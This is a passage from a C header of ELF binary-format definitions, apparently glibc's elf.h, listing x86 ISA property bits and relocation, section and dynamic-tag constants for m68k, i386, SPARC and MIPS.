/* GNU_PROPERTY_X86_ISA_1_BASELINE: CMOV, CX8 (cmpxchg8b), FPU (fld),
   MMX, OSFXSR (fxsave), SCE (syscall), SSE and SSE2.  */
#define GNU_PROPERTY_X86_ISA_1_BASELINE		(1U << 0)
/* GNU_PROPERTY_X86_ISA_1_V2: GNU_PROPERTY_X86_ISA_1_BASELINE,
   CMPXCHG16B (cmpxchg16b), LAHF-SAHF (lahf), POPCNT (popcnt), SSE3,
   SSSE3, SSE4.1 and SSE4.2.  */
#define GNU_PROPERTY_X86_ISA_1_V2		(1U << 1)
/* GNU_PROPERTY_X86_ISA_1_V3: GNU_PROPERTY_X86_ISA_1_V2, AVX, AVX2, BMI1,
   BMI2, F16C, FMA, LZCNT, MOVBE, XSAVE.  */
#define GNU_PROPERTY_X86_ISA_1_V3		(1U << 2)
/* GNU_PROPERTY_X86_ISA_1_V4: GNU_PROPERTY_X86_ISA_1_V3, AVX512F,
   AVX512BW, AVX512CD, AVX512DQ and AVX512VL.  */
#define GNU_PROPERTY_X86_ISA_1_V4		(1U << 3)

/* This indicates that all executable sections are compatible with
   IBT.  */
#define GNU_PROPERTY_X86_FEATURE_1_IBT		(1U << 0)
/* This indicates that all executable sections are compatible with
   SHSTK.  */
#define GNU_PROPERTY_X86_FEATURE_1_SHSTK	(1U << 1)

/* Move records.  */
typedef struct
{
  Elf32_Xword m_value;		/* Symbol value.  */
  Elf32_Word m_info;		/* Size and index.  */
  Elf32_Word m_poffset;		/* Symbol offset.  */
  Elf32_Half m_repeat;		/* Repeat count.  */
  Elf32_Half m_stride;		/* Stride info.  */
} Elf32_Move;

typedef struct
{
  Elf64_Xword m_value;		/* Symbol value.  */
  Elf64_Xword m_info;		/* Size and index.  */
  Elf64_Xword m_poffset;	/* Symbol offset.  */
  Elf64_Half m_repeat;		/* Repeat count.  */
  Elf64_Half m_stride;		/* Stride info.  */
} Elf64_Move;

/* Macro to construct move records.  */
#define ELF32_M_SYM(info)	((info) >> 8)
#define ELF32_M_SIZE(info)	((unsigned char) (info))
#define ELF32_M_INFO(sym, size)	(((sym) << 8) + (unsigned char) (size))

#define ELF64_M_SYM(info)	ELF32_M_SYM (info)
#define ELF64_M_SIZE(info)	ELF32_M_SIZE (info)
#define ELF64_M_INFO(sym, size)	ELF32_M_INFO (sym, size)


/* Motorola 68k specific definitions.  */

/* Values for Elf32_Ehdr.e_flags.  */
#define EF_CPU32	0x00810000

/* m68k relocs.  */

#define R_68K_NONE	0		/* No reloc */
#define R_68K_32	1		/* Direct 32 bit  */
#define R_68K_16	2		/* Direct 16 bit  */
#define R_68K_8		3		/* Direct 8 bit  */
#define R_68K_PC32	4		/* PC relative 32 bit */
#define R_68K_PC16	5		/* PC relative 16 bit */
#define R_68K_PC8	6		/* PC relative 8 bit */
#define R_68K_GOT32	7		/* 32 bit PC relative GOT entry */
#define R_68K_GOT16	8		/* 16 bit PC relative GOT entry */
#define R_68K_GOT8	9		/* 8 bit PC relative GOT entry */
#define R_68K_GOT32O	10		/* 32 bit GOT offset */
#define R_68K_GOT16O	11		/* 16 bit GOT offset */
#define R_68K_GOT8O	12		/* 8 bit GOT offset */
#define R_68K_PLT32	13		/* 32 bit PC relative PLT address */
#define R_68K_PLT16	14		/* 16 bit PC relative PLT address */
#define R_68K_PLT8	15		/* 8 bit PC relative PLT address */
#define R_68K_PLT32O	16		/* 32 bit PLT offset */
#define R_68K_PLT16O	17		/* 16 bit PLT offset */
#define R_68K_PLT8O	18		/* 8 bit PLT offset */
#define R_68K_COPY	19		/* Copy symbol at runtime */
#define R_68K_GLOB_DAT	20		/* Create GOT entry */
#define R_68K_JMP_SLOT	21		/* Create PLT entry */
#define R_68K_RELATIVE	22		/* Adjust by program base */
#define R_68K_TLS_GD32      25          /* 32 bit GOT offset for GD */
#define R_68K_TLS_GD16      26          /* 16 bit GOT offset for GD */
#define R_68K_TLS_GD8       27          /* 8 bit GOT offset for GD */
#define R_68K_TLS_LDM32     28          /* 32 bit GOT offset for LDM */
#define R_68K_TLS_LDM16     29          /* 16 bit GOT offset for LDM */
#define R_68K_TLS_LDM8      30          /* 8 bit GOT offset for LDM */
#define R_68K_TLS_LDO32     31          /* 32 bit module-relative offset */
#define R_68K_TLS_LDO16     32          /* 16 bit module-relative offset */
#define R_68K_TLS_LDO8      33          /* 8 bit module-relative offset */
#define R_68K_TLS_IE32      34          /* 32 bit GOT offset for IE */
#define R_68K_TLS_IE16      35          /* 16 bit GOT offset for IE */
#define R_68K_TLS_IE8       36          /* 8 bit GOT offset for IE */
#define R_68K_TLS_LE32      37          /* 32 bit offset relative to
					   static TLS block */
#define R_68K_TLS_LE16      38          /* 16 bit offset relative to
					   static TLS block */
#define R_68K_TLS_LE8       39          /* 8 bit offset relative to
					   static TLS block */
#define R_68K_TLS_DTPMOD32  40          /* 32 bit module number */
#define R_68K_TLS_DTPREL32  41          /* 32 bit module-relative offset */
#define R_68K_TLS_TPREL32   42          /* 32 bit TP-relative offset */
/* Keep this the last entry.  */
#define R_68K_NUM	43

/* Intel 80386 specific definitions.  */

/* i386 relocs.  */

#define R_386_NONE	   0		/* No reloc */
#define R_386_32	   1		/* Direct 32 bit  */
#define R_386_PC32	   2		/* PC relative 32 bit */
#define R_386_GOT32	   3		/* 32 bit GOT entry */
#define R_386_PLT32	   4		/* 32 bit PLT address */
#define R_386_COPY	   5		/* Copy symbol at runtime */
#define R_386_GLOB_DAT	   6		/* Create GOT entry */
#define R_386_JMP_SLOT	   7		/* Create PLT entry */
#define R_386_RELATIVE	   8		/* Adjust by program base */
#define R_386_GOTOFF	   9		/* 32 bit offset to GOT */
#define R_386_GOTPC	   10		/* 32 bit PC relative offset to GOT */
#define R_386_32PLT	   11
#define R_386_TLS_TPOFF	   14		/* Offset in static TLS block */
#define R_386_TLS_IE	   15		/* Address of GOT entry for static TLS
					   block offset */
#define R_386_TLS_GOTIE	   16		/* GOT entry for static TLS block
					   offset */
#define R_386_TLS_LE	   17		/* Offset relative to static TLS
					   block */
#define R_386_TLS_GD	   18		/* Direct 32 bit for GNU version of
					   general dynamic thread local data */
#define R_386_TLS_LDM	   19		/* Direct 32 bit for GNU version of
					   local dynamic thread local data
					   in LE code */
#define R_386_16	   20
#define R_386_PC16	   21
#define R_386_8		   22
#define R_386_PC8	   23
#define R_386_TLS_GD_32	   24		/* Direct 32 bit for general dynamic
					   thread local data */
#define R_386_TLS_GD_PUSH  25		/* Tag for pushl in GD TLS code */
#define R_386_TLS_GD_CALL  26		/* Relocation for call to
					   __tls_get_addr() */
#define R_386_TLS_GD_POP   27		/* Tag for popl in GD TLS code */
#define R_386_TLS_LDM_32   28		/* Direct 32 bit for local dynamic
					   thread local data in LE code */
#define R_386_TLS_LDM_PUSH 29		/* Tag for pushl in LDM TLS code */
#define R_386_TLS_LDM_CALL 30		/* Relocation for call to
					   __tls_get_addr() in LDM code */
#define R_386_TLS_LDM_POP  31		/* Tag for popl in LDM TLS code */
#define R_386_TLS_LDO_32   32		/* Offset relative to TLS block */
#define R_386_TLS_IE_32	   33		/* GOT entry for negated static TLS
					   block offset */
#define R_386_TLS_LE_32	   34		/* Negated offset relative to static
					   TLS block */
#define R_386_TLS_DTPMOD32 35		/* ID of module containing symbol */
#define R_386_TLS_DTPOFF32 36		/* Offset in TLS block */
#define R_386_TLS_TPOFF32  37		/* Negated offset in static TLS block */
#define R_386_SIZE32	   38 		/* 32-bit symbol size */
#define R_386_TLS_GOTDESC  39		/* GOT offset for TLS descriptor.  */
#define R_386_TLS_DESC_CALL 40		/* Marker of call through TLS
					   descriptor for
					   relaxation.  */
#define R_386_TLS_DESC     41		/* TLS descriptor containing
					   pointer to code and to
					   argument, returning the TLS
					   offset for the symbol.  */
#define R_386_IRELATIVE	   42		/* Adjust indirectly by program base */
#define R_386_GOT32X	   43		/* Load from 32 bit GOT entry,
					   relaxable. */
/* Keep this the last entry.  */
#define R_386_NUM	   44

/* SUN SPARC specific definitions.  */

/* Legal values for ST_TYPE subfield of st_info (symbol type).  */

#define STT_SPARC_REGISTER	13	/* Global register reserved to app. */

/* Values for Elf64_Ehdr.e_flags.  */

#define EF_SPARCV9_MM		3
#define EF_SPARCV9_TSO		0
#define EF_SPARCV9_PSO		1
#define EF_SPARCV9_RMO		2
#define EF_SPARC_LEDATA		0x800000 /* little endian data */
#define EF_SPARC_EXT_MASK	0xFFFF00
#define EF_SPARC_32PLUS		0x000100 /* generic V8+ features */
#define EF_SPARC_SUN_US1	0x000200 /* Sun UltraSPARC1 extensions */
#define EF_SPARC_HAL_R1		0x000400 /* HAL R1 extensions */
#define EF_SPARC_SUN_US3	0x000800 /* Sun UltraSPARCIII extensions */

/* SPARC relocs.  */

#define R_SPARC_NONE		0	/* No reloc */
#define R_SPARC_8		1	/* Direct 8 bit */
#define R_SPARC_16		2	/* Direct 16 bit */
#define R_SPARC_32		3	/* Direct 32 bit */
#define R_SPARC_DISP8		4	/* PC relative 8 bit */
#define R_SPARC_DISP16		5	/* PC relative 16 bit */
#define R_SPARC_DISP32		6	/* PC relative 32 bit */
#define R_SPARC_WDISP30		7	/* PC relative 30 bit shifted */
#define R_SPARC_WDISP22		8	/* PC relative 22 bit shifted */
#define R_SPARC_HI22		9	/* High 22 bit */
#define R_SPARC_22		10	/* Direct 22 bit */
#define R_SPARC_13		11	/* Direct 13 bit */
#define R_SPARC_LO10		12	/* Truncated 10 bit */
#define R_SPARC_GOT10		13	/* Truncated 10 bit GOT entry */
#define R_SPARC_GOT13		14	/* 13 bit GOT entry */
#define R_SPARC_GOT22		15	/* 22 bit GOT entry shifted */
#define R_SPARC_PC10		16	/* PC relative 10 bit truncated */
#define R_SPARC_PC22		17	/* PC relative 22 bit shifted */
#define R_SPARC_WPLT30		18	/* 30 bit PC relative PLT address */
#define R_SPARC_COPY		19	/* Copy symbol at runtime */
#define R_SPARC_GLOB_DAT	20	/* Create GOT entry */
#define R_SPARC_JMP_SLOT	21	/* Create PLT entry */
#define R_SPARC_RELATIVE	22	/* Adjust by program base */
#define R_SPARC_UA32		23	/* Direct 32 bit unaligned */

/* Additional Sparc64 relocs.  */

#define R_SPARC_PLT32		24	/* Direct 32 bit ref to PLT entry */
#define R_SPARC_HIPLT22		25	/* High 22 bit PLT entry */
#define R_SPARC_LOPLT10		26	/* Truncated 10 bit PLT entry */
#define R_SPARC_PCPLT32		27	/* PC rel 32 bit ref to PLT entry */
#define R_SPARC_PCPLT22		28	/* PC rel high 22 bit PLT entry */
#define R_SPARC_PCPLT10		29	/* PC rel trunc 10 bit PLT entry */
#define R_SPARC_10		30	/* Direct 10 bit */
#define R_SPARC_11		31	/* Direct 11 bit */
#define R_SPARC_64		32	/* Direct 64 bit */
#define R_SPARC_OLO10		33	/* 10bit with secondary 13bit addend */
#define R_SPARC_HH22		34	/* Top 22 bits of direct 64 bit */
#define R_SPARC_HM10		35	/* High middle 10 bits of ... */
#define R_SPARC_LM22		36	/* Low middle 22 bits of ... */
#define R_SPARC_PC_HH22		37	/* Top 22 bits of pc rel 64 bit */
#define R_SPARC_PC_HM10		38	/* High middle 10 bit of ... */
#define R_SPARC_PC_LM22		39	/* Low miggle 22 bits of ... */
#define R_SPARC_WDISP16		40	/* PC relative 16 bit shifted */
#define R_SPARC_WDISP19		41	/* PC relative 19 bit shifted */
#define R_SPARC_GLOB_JMP	42	/* was part of v9 ABI but was removed */
#define R_SPARC_7		43	/* Direct 7 bit */
#define R_SPARC_5		44	/* Direct 5 bit */
#define R_SPARC_6		45	/* Direct 6 bit */
#define R_SPARC_DISP64		46	/* PC relative 64 bit */
#define R_SPARC_PLT64		47	/* Direct 64 bit ref to PLT entry */
#define R_SPARC_HIX22		48	/* High 22 bit complemented */
#define R_SPARC_LOX10		49	/* Truncated 11 bit complemented */
#define R_SPARC_H44		50	/* Direct high 12 of 44 bit */
#define R_SPARC_M44		51	/* Direct mid 22 of 44 bit */
#define R_SPARC_L44		52	/* Direct low 10 of 44 bit */
#define R_SPARC_REGISTER	53	/* Global register usage */
#define R_SPARC_UA64		54	/* Direct 64 bit unaligned */
#define R_SPARC_UA16		55	/* Direct 16 bit unaligned */
#define R_SPARC_TLS_GD_HI22	56
#define R_SPARC_TLS_GD_LO10	57
#define R_SPARC_TLS_GD_ADD	58
#define R_SPARC_TLS_GD_CALL	59
#define R_SPARC_TLS_LDM_HI22	60
#define R_SPARC_TLS_LDM_LO10	61
#define R_SPARC_TLS_LDM_ADD	62
#define R_SPARC_TLS_LDM_CALL	63
#define R_SPARC_TLS_LDO_HIX22	64
#define R_SPARC_TLS_LDO_LOX10	65
#define R_SPARC_TLS_LDO_ADD	66
#define R_SPARC_TLS_IE_HI22	67
#define R_SPARC_TLS_IE_LO10	68
#define R_SPARC_TLS_IE_LD	69
#define R_SPARC_TLS_IE_LDX	70
#define R_SPARC_TLS_IE_ADD	71
#define R_SPARC_TLS_LE_HIX22	72
#define R_SPARC_TLS_LE_LOX10	73
#define R_SPARC_TLS_DTPMOD32	74
#define R_SPARC_TLS_DTPMOD64	75
#define R_SPARC_TLS_DTPOFF32	76
#define R_SPARC_TLS_DTPOFF64	77
#define R_SPARC_TLS_TPOFF32	78
#define R_SPARC_TLS_TPOFF64	79
#define R_SPARC_GOTDATA_HIX22	80
#define R_SPARC_GOTDATA_LOX10	81
#define R_SPARC_GOTDATA_OP_HIX22	82
#define R_SPARC_GOTDATA_OP_LOX10	83
#define R_SPARC_GOTDATA_OP	84
#define R_SPARC_H34		85
#define R_SPARC_SIZE32		86
#define R_SPARC_SIZE64		87
#define R_SPARC_WDISP10		88
#define R_SPARC_JMP_IREL	248
#define R_SPARC_IRELATIVE	249
#define R_SPARC_GNU_VTINHERIT	250
#define R_SPARC_GNU_VTENTRY	251
#define R_SPARC_REV32		252
/* Keep this the last entry.  */
#define R_SPARC_NUM		253

/* For Sparc64, legal values for d_tag of Elf64_Dyn.  */

#define DT_SPARC_REGISTER	0x70000001
#define DT_SPARC_NUM		2

/* MIPS R3000 specific definitions.  */

/* Legal values for e_flags field of Elf32_Ehdr.  */

#define EF_MIPS_NOREORDER	1     /* A .noreorder directive was used.  */
#define EF_MIPS_PIC		2     /* Contains PIC code.  */
#define EF_MIPS_CPIC		4     /* Uses PIC calling sequence.  */
#define EF_MIPS_XGOT		8
#define EF_MIPS_64BIT_WHIRL	16
#define EF_MIPS_ABI2		32
#define EF_MIPS_ABI_ON32	64
#define EF_MIPS_FP64		512  /* Uses FP64 (12 callee-saved).  */
#define EF_MIPS_NAN2008	1024  /* Uses IEEE 754-2008 NaN encoding.  */
#define EF_MIPS_ARCH		0xf0000000 /* MIPS architecture level.  */

/* Legal values for MIPS architecture level.  */

#define EF_MIPS_ARCH_1		0x00000000 /* -mips1 code.  */
#define EF_MIPS_ARCH_2		0x10000000 /* -mips2 code.  */
#define EF_MIPS_ARCH_3		0x20000000 /* -mips3 code.  */
#define EF_MIPS_ARCH_4		0x30000000 /* -mips4 code.  */
#define EF_MIPS_ARCH_5		0x40000000 /* -mips5 code.  */
#define EF_MIPS_ARCH_32		0x50000000 /* MIPS32 code.  */
#define EF_MIPS_ARCH_64		0x60000000 /* MIPS64 code.  */
#define EF_MIPS_ARCH_32R2	0x70000000 /* MIPS32r2 code.  */
#define EF_MIPS_ARCH_64R2	0x80000000 /* MIPS64r2 code.  */

/* The following are unofficial names and should not be used.  */

#define E_MIPS_ARCH_1		EF_MIPS_ARCH_1
#define E_MIPS_ARCH_2		EF_MIPS_ARCH_2
#define E_MIPS_ARCH_3		EF_MIPS_ARCH_3
#define E_MIPS_ARCH_4		EF_MIPS_ARCH_4
#define E_MIPS_ARCH_5		EF_MIPS_ARCH_5
#define E_MIPS_ARCH_32		EF_MIPS_ARCH_32
#define E_MIPS_ARCH_64		EF_MIPS_ARCH_64

/* Special section indices.  */

#define SHN_MIPS_ACOMMON	0xff00	/* Allocated common symbols.  */
#define SHN_MIPS_TEXT		0xff01	/* Allocated test symbols.  */
#define SHN_MIPS_DATA		0xff02	/* Allocated data symbols.  */
#define SHN_MIPS_SCOMMON 	0xff03	/* Small common symbols.  */
#define SHN_MIPS_SUNDEFINED	0xff04	/* Small undefined symbols.  */

/* Legal values for sh_type field of Elf32_Shdr.  */

#define SHT_MIPS_LIBLIST	0x70000000 /* Shared objects used in link.  */
#define SHT_MIPS_MSYM		0x70000001
#define SHT_MIPS_CONFLICT	0x70000002 /* Conflicting symbols.  */
#define SHT_MIPS_GPTAB		0x70000003 /* Global data area sizes.  */
#define SHT_MIPS_UCODE		0x70000004 /* Reserved for SGI/MIPS compilers */
#define SHT_MIPS_DEBUG		0x70000005 /* MIPS ECOFF debugging info.  */
#define SHT_MIPS_REGINFO	0x70000006 /* Register usage information.  */
#define SHT_MIPS_PACKAGE	0x70000007
#define SHT_MIPS_PACKSYM	0x70000008
#define SHT_MIPS_RELD		0x70000009
#define SHT_MIPS_IFACE		0x7000000b
#define SHT_MIPS_CONTENT	0x7000000c
#define SHT_MIPS_OPTIONS	0x7000000d /* Miscellaneous options.  */
#define SHT_MIPS_SHDR		0x70000010
#define SHT_MIPS_FDESC		0x70000011
#define SHT_MIPS_EXTSYM		0x70000012
#define SHT_MIPS_DENSE		0x70000013
#define SHT_MIPS_PDESC		0x70000014
#define SHT_MIPS_LOCSYM		0x70000015
#define SHT_MIPS_AUXSYM		0x70000016
#define SHT_MIPS_OPTSYM		0x70000017
#define SHT_MIPS_LOCSTR		0x70000018
#define SHT_MIPS_LINE		0x70000019
#define SHT_MIPS_RFDESC		0x7000001a
#define SHT_MIPS_DELTASYM	0x7000001b
#define SHT_MIPS_DELTAINST	0x7000001c
#define SHT_MIPS_DELTACLASS	0x7000001d
#define SHT_MIPS_DWARF		0x7000001e /* DWARF debugging information.  */
#define SHT_MIPS_DELTADECL	0x7000001f
#define SHT_MIPS_SYMBOL_LIB	0x70000020
#define SHT_MIPS_EVENTS		0x70000021 /* Event section.  */
#define SHT_MIPS_TRANSLATE	0x70000022
#define SHT_MIPS_PIXIE		0x70000023
#define SHT_MIPS_XLATE		0x70000024
#define SHT_MIPS_XLATE_DEBUG	0x70000025
#define SHT_MIPS_WHIRL		0x70000026
#define SHT_MIPS_EH_REGION	0x70000027
#define SHT_MIPS_XLATE_OLD	0x70000028
#define SHT_MIPS_PDR_EXCEPTION	0x70000029
#define SHT_MIPS_XHASH		0x7000002b

/* Legal values for sh_flags field of Elf32_Shdr.  */

#define SHF_MIPS_GPREL		0x10000000 /* Must be in global data area.  */
#define SHF_MIPS_MERGE		0x20000000
#define SHF_MIPS_ADDR		0x40000000
#define SHF_MIPS_STRINGS	0x80000000
#define SHF_MIPS_NOSTRIP	0x08000000
#define SHF_MIPS_LOCAL		0x04000000
#define SHF_MIPS_NAMES		0x02000000
#define SHF_MIPS_NODUPE		0x01000000


/* Symbol tables.  */

/* MIPS specific values for `st_other\'.  */
#define STO_MIPS_DEFAULT		0x0
#define STO_MIPS_INTERNAL		0x1
#define STO_MIPS_HIDDEN			0x2
#define STO_MIPS_PROTECTED		0x3
#define STO_MIPS_PLT			0x8
#define STO_MIPS_SC_ALIGN_UNUSED	0xff

/* MIPS specific values for `st_info\'.  */
#define STB_MIPS_SPLIT_COMMON		13

/* Entries found in sections of type SHT_MIPS_GPTAB.  */

typedef union
{
  struct
    {
      Elf32_Word gt_current_g_value;	/* -G value used for compilation.  */
      Elf32_Word gt_unused;		/* Not used.  */
    } gt_header;			/* First entry in section.  */
  struct
    {
      Elf32_Word gt_g_value;		/* If this value were used for -G.  */
      Elf32_Word gt_bytes;		/* This many bytes would be used.  */
    } gt_entry;				/* Subsequent entries in section.  */
} Elf32_gptab;

/* Entry found in sections of type SHT_MIPS_REGINFO.  */

typedef struct
{
  Elf32_Word ri_gprmask;		/* General registers used.  */
  Elf32_Word ri_cprmask[4];		/* Coprocessor registers used.  */
  Elf32_Sword ri_gp_value;		/* $gp register value.  */
} Elf32_RegInfo;

/* Entries found in sections of type SHT_MIPS_OPTIONS.  */

typedef struct
{
  unsigned char kind;		/* Determines interpretation of the
				   variable part of descriptor.  */
  unsigned char size;		/* Size of descriptor, including header.  */
  Elf32_Section section;	/* Section header index of section affected,
				   0 for global options.  */
  Elf32_Word info;		/* Kind-specific information.  */
} Elf_Options;

/* Values for `kind\' field in Elf_Options.  */

#define ODK_NULL	0	/* Undefined.  */
#define ODK_REGINFO	1	/* Register usage information.  */
#define ODK_EXCEPTIONS	2	/* Exception processing options.  */
#define ODK_PAD		3	/* Section padding options.  */
#define ODK_HWPATCH	4	/* Hardware workarounds performed */
#define ODK_FILL	5	/* record the fill value used by the linker. */
#define ODK_TAGS	6	/* reserve space for desktop tools to write. */
#define ODK_HWAND	7	/* HW workarounds.  \'AND\' bits when merging. */
#define ODK_HWOR	8	/* HW workarounds.  \'OR\' bits when merging.  */

/* Values for `info\' in Elf_Options for ODK_EXCEPTIONS entries.  */

#define OEX_FPU_MIN	0x1f	/* FPE\'s which MUST be enabled.  */
#define OEX_FPU_MAX	0x1f00	/* FPE\'s which MAY be enabled.  */
#define OEX_PAGE0	0x10000	/* page zero must be mapped.  */
#define OEX_SMM		0x20000	/* Force sequential memory mode?  */
#define OEX_FPDBUG	0x40000	/* Force floating point debug mode?  */
#define OEX_PRECISEFP	OEX_FPDBUG
#define OEX_DISMISS	0x80000	/* Dismiss invalid address faults?  */

#define OEX_FPU_INVAL	0x10
#define OEX_FPU_DIV0	0x08
#define OEX_FPU_OFLO	0x04
#define OEX_FPU_UFLO	0x02
#define OEX_FPU_INEX	0x01

/* Masks for `info\' in Elf_Options for an ODK_HWPATCH entry.  */

#define OHW_R4KEOP	0x1	/* R4000 end-of-page patch.  */
#define OHW_R8KPFETCH	0x2	/* may need R8000 prefetch patch.  */
#define OHW_R5KEOP	0x4	/* R5000 end-of-page patch.  */
#define OHW_R5KCVTL	0x8	/* R5000 cvt.[ds].l bug.  clean=1.  */

#define OPAD_PREFIX	0x1
#define OPAD_POSTFIX	0x2
#define OPAD_SYMBOL	0x4

/* Entry found in `.options\' section.  */

typedef struct
{
  Elf32_Word hwp_flags1;	/* Extra flags.  */
  Elf32_Word hwp_flags2;	/* Extra flags.  */
} Elf_Options_Hw;

/* Masks for `info\' in ElfOptions for ODK_HWAND and ODK_HWOR entries.  */

#define OHWA0_R4KEOP_CHECKED	0x00000001
#define OHWA1_R4KEOP_CLEAN	0x00000002

/* MIPS relocs.  */

#define R_MIPS_NONE		0	/* No reloc */
#define R_MIPS_16		1	/* Direct 16 bit */
#define R_MIPS_32		2	/* Direct 32 bit */
#define R_MIPS_REL32		3	/* PC relative 32 bit */
#define R_MIPS_26		4	/* Direct 26 bit shifted */
#define R_MIPS_HI16		5	/* High 16 bit */
#define R_MIPS_LO16		6	/* Low 16 bit */
#define R_MIPS_GPREL16		7	/* GP relative 16 bit */
#define R_MIPS_LITERAL		8	/* 16 bit literal entry */
#define R_MIPS_GOT16		9	/* 16 bit GOT entry */
#define R_MIPS_PC16		10	/* PC relative 16 bit */
#define R_MIPS_CALL16		11	/* 16 bit GOT entry for function */
#define R_MIPS_GPREL32		12	/* GP relative 32 bit */

#define R_MIPS_SHIFT5		16
#define R_MIPS_SHIFT6		17
#define R_MIPS_64		18
#define R_MIPS_GOT_DISP		19
#define R_MIPS_GOT_PAGE		20
#define R_MIPS_GOT_OFST		21
#define R_MIPS_GOT_HI16		22
#define R_MIPS_GOT_LO16		23
#define R_MIPS_SUB		24
#define R_MIPS_INSERT_A		25
#define R_MIPS_INSERT_B		26
#define R_MIPS_DELETE		27
#define R_MIPS_HIGHER		28
#define R_MIPS_HIGHEST		29
#define R_MIPS_CALL_HI16	30
#define R_MIPS_CALL_LO16	31
#define R_MIPS_SCN_DISP		32
#define R_MIPS_REL16		33
#define R_MIPS_ADD_IMMEDIATE	34
#define R_MIPS_PJUMP		35
#define R_MIPS_RELGOT		36
#define R_MIPS_JALR		37
#define R_MIPS_TLS_DTPMOD32	38	/* Module number 32 bit */
#define R_MIPS_TLS_DTPREL32	39	/* Module-relative offset 32 bit */
#define R_MIPS_TLS_DTPMOD64	40	/* Module number 64 bit */
#define R_MIPS_TLS_DTPREL64	41	/* Module-relative offset 64 bit */
#define R_MIPS_TLS_GD		42	/* 16 bit GOT offset for GD */
#define R_MIPS_TLS_LDM		43	/* 16 bit GOT offset for LDM */
#define R_MIPS_TLS_DTPREL_HI16	44	/* Module-relative offset, high 16 bits */
#define R_MIPS_TLS_DTPREL_LO16	45	/* Module-relative offset, low 16 bits */
#define R_MIPS_TLS_GOTTPREL	46	/* 16 bit GOT offset for IE */
#define R_MIPS_TLS_TPREL32	47	/* TP-relative offset, 32 bit */
#define R_MIPS_TLS_TPREL64	48	/* TP-relative offset, 64 bit */
#define R_MIPS_TLS_TPREL_HI16	49	/* TP-relative offset, high 16 bits */
#define R_MIPS_TLS_TPREL_LO16	50	/* TP-relative offset, low 16 bits */
#define R_MIPS_GLOB_DAT		51
#define R_MIPS_COPY		126
#define R_MIPS_JUMP_SLOT        127
/* Keep this the last entry.  */
#define R_MIPS_NUM		128

/* Legal values for p_type field of Elf32_Phdr.  */

#define PT_MIPS_REGINFO	  0x70000000	/* Register usage information. */
#define PT_MIPS_RTPROC	  0x70000001	/* Runtime procedure table. */
#define PT_MIPS_OPTIONS	  0x70000002
#define PT_MIPS_ABIFLAGS  0x70000003	/* FP mode requirement. */

/* Special program header types.  */

#define PF_MIPS_LOCAL	0x10000000

/* Legal values for d_tag field of Elf32_Dyn.  */

#define DT_MIPS_RLD_VERSION  0x70000001	/* Runtime linker interface version */
#define DT_MIPS_TIME_STAMP   0x70000002	/* Timestamp */
#define DT_MIPS_ICHECKSUM    0x70000003	/* Checksum */
#define DT_MIPS_IVERSION     0x70000004	/* Version string (string tbl index) */
#define DT_MIPS_FLAGS	     0x70000005	/* Flags */
#define DT_MIPS_BASE_ADDRESS 0x70000006	/* Base address */
#define DT_MIPS_MSYM	     0x70000007
#define DT_MIPS_CONFLICT     0x70000008	/* Address of CONFLICT section */
#define DT_MIPS_LIBLIST	     0x70000009	/* Address of LIBLIST section */
#define DT_MIPS_LOCAL_GOTNO  0x7000000a	/* Number of local GOT entries */
#define DT_MIPS_CONFLICTNO   0x7000000b	/* Number of CONFLICT entries */
#define DT_MIPS_LIBLISTNO    0x70000010	/* Number of LIBLIST entries */
#define DT_MIPS_SYMTABNO     0x70000011	/* Number of DYNSYM entries */
#define DT_MIPS_UNREFEXTNO   0x70000012	/* First external DYNSYM */
#define DT_MIPS_GOTSYM	     0x70000013	/* First GOT entry in DYNSYM */
#define DT_MIPS_HIPAGENO     0x70000014	/* Number of GOT page table entries */
#define DT_MIPS_RLD_MAP	     0x70000016	/* Address of run time loader map.  */
#define DT_MIPS_DELTA_CLASS  0x70000017	/* Delta C++ class definition.  */
#define DT_MIPS_DELTA_CLASS_NO    0x70000018 /* Number of entries in
						DT_MIPS_DELTA_CLASS.  */
#define DT_MIPS_DELTA_INSTANCE    0x70000019 /* Delta C++ class instances.  */
#define DT_MIPS_DELTA_INSTANCE_NO 0x7000001a /* Number of entries in
						DT_MIPS_DELTA_INSTANCE.  */
#define DT_MIPS_DELTA_RELOC  0x7000001b /* Delta relocations.  */
#define DT_MIPS_DELTA_RELOC_NO 0x7000001c /* Number of entries in
					     DT_MIPS_DELTA_RELOC.  */
#define DT_MIPS_DELTA_SYM    0x7000001d /* Delta symbols that Delta
					   relocations refer to.  */
#define DT_MIPS_DELTA_SYM_NO 0x7000001e /* Number of entries in
					   DT_MIPS_DELTA_SYM.  */
#define DT_MIPS_DELTA_CLASSSYM 0x70000020 /* Delta symbols that hold the
					     class declaration.  */
#define DT_MIPS_DELTA_CLASSSYM_NO 0x70000021 /* Number of entries in
						DT_MIPS_DELTA_CLASSSYM.  */
#define DT_MIPS_CXX_FLAGS    0x70000022 /* Flags indicating for C++ flavor.  */
#define DT_MIPS_PIXIE_INIT   0x70000023
#define DT_MIPS_SYMBOL_LIB   0x70000024
#define DT_MIPS_LOCALPAGE_GOTIDX 0x70000025
#define DT_MIPS_LOCAL_GOTIDX 0x70000026
#define DT_MIPS_HIDDEN_GOTIDX 0x70000027
#define DT_MIPS_PROTECTED_GOTIDX 0x70000028
#define DT_MIPS_OPTIONS	     0x70000029 /* Address of .options.  */
#define DT_MIPS_INTERFACE    0x7000002a /* Address of .interface.  */
#define DT_MIPS_DYNSTR_ALIGN 0x7000002b
#define DT_MIPS_INTERFACE_SIZE 0x7000002c /* Size of the .interface section. */
#define DT_MIPS_RLD_TEXT_RESOLVE_ADDR 0x7000002d /* Address of rld_text_rsolve
						    function stored in GOT.  */
#define DT_MIPS_PERF_SUFFIX  0x7000002e /* Default suffix of dso to be added
					   by rld on dlopen() calls.  */
#define DT_MIPS_COMPACT_SIZE 0x7000002f /* (O32)Size of compact rel section. */
#define DT_MIPS_GP_VALUE     0x70000030 /* GP value for aux GOTs.  */
#define DT_MIPS_AUX_DYNAMIC  0x70000031 /* Address of aux .dynamic.  */
/* The address of .got.plt in an executable using the new non-PIC ABI.  */
#define DT_MIPS_PLTGOT	     0x70000032
/* The base of the PLT in an executable using the new non-PIC ABI if that
   PLT is writable.  For a non-writable PLT, this is omitted or has a zero
   value.  */
#define DT_MIPS_RWPLT        0x70000034
/* An alternative description of the classic MIPS RLD_MAP that is usable
   in a PIE as it stores a relative offset from the address of the tag
   rather than an absolute address.  */
#define DT_MIPS_RLD_MAP_REL  0x70000035
/* GNU-style hash table with xlat.  */
#define DT_MIPS_XHASH	     0x70000036
#define DT_MIPS_NUM	     0x37

/* Legal values for DT_MIPS_FLAGS Elf32_Dyn entry.  */

#define RHF_NONE		   0		/* No flags */
#define RHF_QUICKSTART		   (1 << 0)	/* Use quickstart */
